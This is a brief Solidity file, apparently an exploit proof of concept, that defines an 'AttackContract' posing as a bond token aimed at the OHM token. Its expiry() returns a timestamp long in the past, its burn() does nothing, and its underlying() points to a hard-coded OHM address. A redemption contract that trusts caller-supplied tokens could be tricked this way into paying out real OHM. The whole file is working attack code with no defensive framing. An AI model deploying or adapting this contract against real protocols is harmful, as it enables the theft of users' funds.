//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.9;

interface ERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface ERC20BondToken is ERC20 {
    function underlying() external pure returns (ERC20 _underlying);
    function expiry() external pure returns (uint48 _expiry);
}

contract AttackContract {
    // Address of OHM Token
    address OHMTokenAddress = 0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5;

    function expiry() external pure returns (uint48 _expiry) {
        // Return a timestamp anytime before now
        return uint48(0x5);
    }

    function burn(address from, uint256 amount) external {
        return;
    }

    function underlying() external view returns (ERC20 _underlying) {
        return ERC20(OHMTokenAddress);
    }
}